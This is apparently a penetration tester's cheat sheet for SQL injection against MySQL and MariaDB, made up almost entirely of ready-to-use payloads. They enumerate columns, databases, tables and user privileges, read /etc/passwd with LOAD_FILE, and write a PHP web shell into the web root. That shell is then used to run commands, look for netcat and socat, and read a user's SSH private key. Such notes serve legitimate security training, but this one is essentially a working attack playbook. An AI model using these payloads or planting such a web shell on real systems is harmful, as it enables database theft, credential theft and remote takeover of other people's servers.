## Mariadb / MySQL
' ORDER BY 1 -- - Increment until you get an exception like "Unknown column '5' in 'order clause'"
VALUE' UNION SELECT 1 -- - Where value is something useful to the db you are testing. Exceptions thrown until you hit enough columns to match current Table:
VALUE' UNION SELECT 1,2 -- -
VALUE' UNION SELECT 1,2,3 -- -
VALUE' UNION SELECT 1,2,3,4 -- -
VALUE' UNION SELECT 1,@@version,2,3,4 -- -
VALUE' UNION SELECT 1,2,user(),4 -- -
VALUE' UNION SELECT 1,SLEEP(5),3,4 -- - Blind SQL, test if we can get a delay on response.
VALUE' UNION SELECT 1,2,POW(1,1),4 -- - POW(1,1) is specific to MySQL / Mariadb

# If webserver is NGINX or Apache, most likely a Linux variant like MySQL, Mariadb, MongoDB, or Postgresql.
# If webserver is IIS, most likely MSSQL.
#  Not always true so make sure you test all possible fuzzing for each db syntax. Remember Docker containers help with syntax checks.


## Using the INFORMATION_SCHEMA database
# Command to see databases:
SELECT SCHEMA_NAME FROM INFORMATION_SCHEMA.SCHEMATA;

# Useful commands to query information_schema
union select 1,2,3,4,table_name from information_schema.tables
union select 1,2,3,4,column_name from information_schema.columns where table_name='users'
Make sure to move the column_name around - this is useful as some fields will print more than others.

# SQLi to see databases
VALUE' UNION SELECT 1,schema_name,3,4 from INFORMATION_SCHEMA.SCHEMATA -- - Will show all db's that exist, the current user has access
VALUE' UNION SELECT 1,database(),3,4 -- - Will show the current working database

# SQLi to see tables within databases
VALUE' UNION SELECT 1,TABLE_NAME,TABLE_SCHEMA,4 from INFORMATION_SCHEMA.TABLES where table_schema='DATABASENAME' -- - this shows only tables in DATABASENAME, otherwise we may get a tone of output.

# SQLi to see columns within a table
VALUE' UNION SELECT 1,COLUMN_NAME,TABLE_NAME,TABLE_SCHEMA from INFORMATION_SCHEMA.COLUMNS WHERE table_name='TABLENAME' -- - This will show the columns in the TABLENAME table.

# Dump the data from the db.table
VALUE' UNION SELECT 1,COLUMN1,COLUMN2,4 from DB.TABLE -- -


## DB user commands
SELECT USER();
SELECT CURRENT_USER();
SELECT user from mysql.user;

# Now as SQLi
VALUE' UNION SELECT 1,user(),3,4 -- -
OR
VALUE' UNION SELECT 1,user,3,4 from mysql.user -- -


## USER PRIVILEGES
# Now that we know user, we need our privs
SELECT super_priv FROM mysql.user;

#SQLi version
VALUE' UNION SELECT 1,super_priv,3,4 FROM mysql.user -- -
VALUE' UNION SELECT 1,super_priv,3,4 FROM mysql.user where user='USER' -- - This will narrow down to the user specified, like root.
# Value returned with a "Y" means we have the super_priv privilege. 

# If we want just a dump, use this:
VALUE' UNION SELECT 1,grantee,privilege_type,is_grantable FROM information_schema.user_privileges -- -


# Read / Write files
# SQL command
SELECT LOAD_FILE('/etc/passwd');

#SQLi version
VALUE' UNION SELECT 1,LOAD_FILE('/etc/passwd'),3,4 -- -

# Remember reading php,html,etc files, you will need to read the source version since your browser will render html.



## Writing Files to SQL
# Must have: 
	FILE privs enabled
		SELECT super_priv FROM mysql.user;
		VALUE' UNION SELECT 1, super_priv, 3, 4 FROM mysql.user -- -
	secure_file_priv variable is disabled - if empty, we write anywhere. Otherwise we can only write in certain directories
		SHOW VARIABLES LIKE 'secure_file_priv';
		SELECT variable_name, variable_value FROM information_schema.global_variables WHERE variable_name='secure_file_priv';
		VALUE' UNION SELECT 1,variable_name,variable_value,4 FROM information_schema.global_variables where variable_name='secure_file_priv' -- -
	write access to the location we want to write
		SELECT 'text we want in a file' INTO OUTFILE '/var/www/html/test.txt';
		VALUE' UNION SELECT 1,'text we want in a file',3,4 INTO OUTFILE '/var/www/html/test.txt' -- -
		VALUE' UNION SELECT "",'text we want in a file',"","", INTO OUTFILE '/var/www/html/test.txt' -- - for a cleaner output
			Check it - https://somedomain:port/test.txt

## Writing a webshell
# Assuming this is a php server, this one-liner will let you query the backend
<?php system($_REQUEST[0]); ?>
VALUE' UNION SELECT "",'<?php system($_REQUEST[0]); ?>',"","" INTO OUTFILE '/var/www/html/shell.php' -- -

# Now we check
	https://somedomain:port/shell.php?0=whoami
	https://somedomain:port/shell.php?0=id
	https://somedomain:port/shell.php?0=which+nc
	https://somedomain:port/shell.php?0=which_ncat
	https://somedomain:port/shell.php?0=which+socat
	https://somedomain:port/shell.php?0=ls+/
	https://somedomain:port/shell.php?0=cat+/home/user/.ssh/id_rsa


If SQL allows loading from a file:
	http://somedomain:port/test.php?id=1 union select 1,2,load_file('C:/Windows/System32/drivers/etc/hosts')

